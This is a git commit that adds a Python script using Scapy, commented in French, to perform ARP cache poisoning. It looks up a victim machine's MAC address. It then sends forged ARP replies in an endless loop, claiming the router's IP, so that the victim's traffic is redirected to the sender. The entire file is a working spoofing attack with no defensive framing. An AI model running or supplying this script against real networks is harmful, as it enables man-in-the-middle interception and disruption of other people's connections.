4b577377caed724cba5f21f0dbdb9e4b86e878a1
Reng-Deng-DenG <60116535+Reng-Deng-DenG@users.noreply.github.com>
2020-06-11 20:16:03 +0200

    Add files via upload

---
+++ arpPoisoning.py
@@ -0,0 +1,42 @@
+from scapy.all import *
+
+# Configuration
+conf.iface = "wlo1"# Interface réseau utilisée
+conf.verb = 0 # Déactivation des notifications
+conf.checkIPaddr = False# désactiver la vérification des adresses par Scapy
+
+'''
+op=1 => ARP REQUEST
+op=2 => ARP REPLY
+
+psrc => Address IP de l'expiditeur/ IP SPOOF
+hwsrc= => Address MAC l'expiditeur/ Address MAC SPOOF
+
+hwdst => Address mac de la cible/ MAC VICTM
+pdst = > Address ip de la cible/ IP victim
+
+'''
+
+
+def GetMacAddress(ip):
+
+	on, off = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=ip), timeout=3)
+
+	if on:
+		print('{} is at {}'.format(ip, on[0][1].hwsrc))
+		return on[0][1].hwsrc# Récupération de la MAC Address dans la réponse ARP
+	else:
+		print('Unable to get MAC Address FROM {}'.format(ip))
+		exit()
+
+target_ip = '192.168.1.13'# IP cible
+host_ip = '192.168.1.1'# L'hôte a usurper
+
+target_mac = GetMacAddress(target_ip)# Récupération de la mac address de l'IP ciblée
+
+ARP_REPLY = ARP(psrc=host_ip, pdst=target_ip, hwdst=target_mac, op=2)
+send(ARP_REPLY, loop=1)
+
+
+
+
